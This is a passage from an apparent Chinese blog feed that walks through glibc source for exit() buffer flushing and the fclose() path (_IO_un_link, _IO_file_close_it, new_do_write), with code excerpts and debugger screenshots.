否则继续处理下一个文件指针</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果定义了 _IO_MTSAFE_IO 宏，就解锁 list_all_lock，同时结束清理区域的操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将所有打开的文件指针的缓冲区中的数据输出，并清空缓冲区。函数的返回值为 <code>0</code> 或 <code>EOF</code>，表示输出是否成功。函数参数 <code>do_lock</code> 表示是否需要对文件指针加锁操作。函数主要采用了循环遍历 _IO_list_all 链表的方式来处理所有打开的文件指针。其中，如果定义了 <code>_IO_MTSAFE_IO</code> 宏，则使用了线程安全的加锁和解锁操作。</p><p>函数里调用_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p>调用虚表中的__overflow，即_IO_new_file_overflow函数，第一参数_IO_FILE文件流结构体，第二个参数 EOF(-1)</p><p>fwrite分析过，会来到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">     f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p><img src="/2023/04/02/exit/image-20230402224531539.png" alt="image-20230402224531539"></p><p><img src="/2023/04/02/exit/image-20230402224604948.png" alt="image-20230402224604948"></p><p><img src="/2023/04/02/exit/image-20230402224642501.png" alt="image-20230402224642501"></p><p>调用了vtable中__write对应的<code>_IO_new_file_write</code></p><p>执行系统调用write把数据写入文件</p><p><img src="/2023/04/02/exit/image-20230402230052468.png" alt="image-20230402230052468"></p><h4 id="IO-unbuffer-all"><a href="#IO-unbuffer-all" class="headerlink" title="_IO_unbuffer_all"></a>_IO_unbuffer_all</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">      &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">      <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment">         stream.  */</span></span><br><span class="line">          __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">        &#123;</span><br><span class="line">          fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">          fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">          freeres_list = fp;</span><br><span class="line">          fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">        _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">        _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment">     used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_SETBUF (fp, NULL, 0)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SETBUF(*FP*, *BUFFER*, *LENGTH*) JUMP2 (__setbuf, FP, BUFFER, LENGTH)</span></span><br></pre></td></tr></table></figure><p><strong>! (fp-&gt;_flags &amp; _IO_UNBUFFERED) &amp;&amp; fp-&gt;_mode !&#x3D; 0</strong></p><p>循环调用每个文件流的<mark>&#x3D;&#x3D;vatble里__setbuf对应的_IO_new_file_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_setbuf _IO_file_setbuf</span></span><br><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYNC(FP) JUMP0 (__sync, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;vtable __sync 对应的_IO_default_setbuf&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_default_setbuf (_IO_FILE *fp, <span class="type">char</span> *p, _IO_ssize_t len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">    fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">    _IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure><p>取消所有缓冲区，包括标准I&#x2F;O流和用户打开的文件流，以便文件的所有数据都立即被写入磁盘而不会留在缓冲区中。它遍历所有的_IO_FILE对象，并检查它们是否已被缓冲，如果是，则取消缓冲，并设置_IO_FILE对象的标志以指示它们已被缓冲。它还将_IO_FILE对象的模式设置为-1，以确保不再使用宽字符函数。在多线程环境下，代码使用锁来确保线程安全。</p><h2 id="内核层面"><a href="#内核层面" class="headerlink" title="内核层面"></a>内核层面</h2><h3 id="exit"><a href="#exit" class="headerlink" title="_exit()"></a>_exit()</h3><p>最后调用_exit系统调用销毁进程</p><ol><li><code>_exit</code>会立刻中断当前进程</li><li>关闭所有属于该进程的文件</li><li>将该进程的所有子进程移交给<code>init</code>进程</li><li>给该进程的父进程发送<code>SIGCHLD</code>信号</li><li><code>_exit</code>的参数<code>status</code>会被返回给父进程，可以被父进程的<code>wait</code>函数接收。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>用户层面：释放TLS，需要释放libc中的流缓冲区, 退出前清空下stdout的缓冲区</p><p>内核层面：释放掉这个进程打开的文件描述符, 释放掉task结构体,有资源都被释放完毕后, 内核会从调度队列从取出这个任务，然后向父进程发送一个信号, 表示有一个子进程终止，此时这个进程才算是真正结束</p><p>进程终止&#x3D;释放所有占有资源+cpu不在分配时间片给</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fclose</title>
      <link href="/2023/04/01/IO-FILE-fclose/"/>
      <url>/2023/04/01/IO-FILE-fclose/</url>
      
        <content type="html"><![CDATA[<p>感谢raycp师傅:<a href="https://xz.aliyun.com/t/5445">https://xz.aliyun.com/t/5445</a></p><h1 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fclose</span><span class="params">(FILE *stream)</span></span><br></pre></td></tr></table></figure><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>] = <span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">0x20</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>断点断到执行到fclose，缓冲区已经初始化</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401212041052.png" alt="image-20230401212041052"></p><h2 id="IO-new-fclose"><a href="#IO-new-fclose" class="headerlink" title="_IO_new_fclose"></a>_IO_new_fclose</h2><p><strong>include&#x2F;stdio.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fclose(fp) _IO_new_fclose(fp)</span></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofclose.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">     the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧是先检测魔数位来到，检查<code>_IO_IS_FILEBUF</code>文件指针 <code>fp</code> 是否与文件缓冲区相关联，</p><h3 id="IO-un-link-脱链"><a href="#IO-un-link-脱链" class="headerlink" title="_IO_un_link 脱链"></a>_IO_un_link 脱链</h3><p>_IO_un_link ((struct _IO_FILE_plus *) fp)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">    ;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">      <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">        &#123;</span><br><span class="line">          *f = fp-&gt;file._chain;</span><br><span class="line">          ++_IO_list_all_stamp;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_un_link)</span><br></pre></td></tr></table></figure><p>IO_link_in逆过程，把文件流结构体从链上拿下来，先检测_IO_LINKED(0x80)，看文件流结构体是不是在IO_list_all链中，随后把_IO_list_all指向chain字段也就是下一个</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401221712640.png" alt="image-20230401221712640"></p><p>再把_IO_LINKED标志位置空</p><h3 id="IO-file-close-it-缓冲区数据写回文件，释放缓冲区，关闭文件"><a href="#IO-file-close-it-缓冲区数据写回文件，释放缓冲区，关闭文件" class="headerlink" title="_IO_file_close_it 缓冲区数据写回文件，释放缓冲区，关闭文件"></a>_IO_file_close_it 缓冲区数据写回文件，释放缓冲区，关闭文件</h3><p><strong>libio&#x2F;fileops.c</strong></p><p>返回_IO_new_fclose 调用_IO_file_close_it (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_close_it _IO_file_close_it</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">              ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">      _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">      _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  _IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  _IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);<span class="comment">//再次确保脱链</span></span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">  fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">  fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_status ? close_status : write_status;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)</span><br></pre></td></tr></table></figure><p>首先检测不可写标志(0x8)，再检测<code>_IO_CURRENTLY_PUTTING(0x800)</code>文件是否处于输出状态。</p><p>在fwrite中设置了_IO_CURRENTLY_PUTTING标志位</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224153932.png" alt="image-20230401224153932"></p><img src="/2023/04/01/IO-FILE-fclose/image-20230401224234824.png" alt="image-20230401224234824" style="zoom:67%;"><h4 id="IO-do-flush-fp-缓冲区数据写回文件"><a href="#IO-do-flush-fp-缓冲区数据写回文件" class="headerlink" title="_IO_do_flush (fp) 缓冲区数据写回文件"></a>_IO_do_flush (fp) 缓冲区数据写回文件</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">           (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和fwrite里分析的一样_IO_SYSWRITE调用了<mark>&#x3D;&#x3D;vtable中__write对应的<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p>写入文件并，刷新输出缓冲区的值</p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230150953.png" alt="image-20230401230150953"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230235192.png" alt="image-20230401230235192"></p><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401230304718.png" alt="image-20230401230304718"></p><h4 id="IO-SYSCLOSE-fp-关闭文件"><a href="#IO-SYSCLOSE-fp-关闭文件" class="headerlink" title="_IO_SYSCLOSE(fp) 关闭文件"></a>_IO_SYSCLOSE(fp) 关闭文件</h4><p>回到_IO_new_file_close_it</p><blockquote><p><code>_IO_FLAGS2_NOCLOSE(32)</code>表示一个流不应该被 <code>fclose()</code> 函数关闭。为流设置 <code>_IO_FLAGS2_NOCLOSE</code> 标志将防止 <code>fclose()</code> 函数关闭与流相关联的文件描述符。这在文件描述符正在被程序的其他部分使用或流正在用于与需要文件描述符保持打开状态的设备进行通信的情况下非常有用</p></blockquote><p>调用_IO_SYSCLOSE(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span 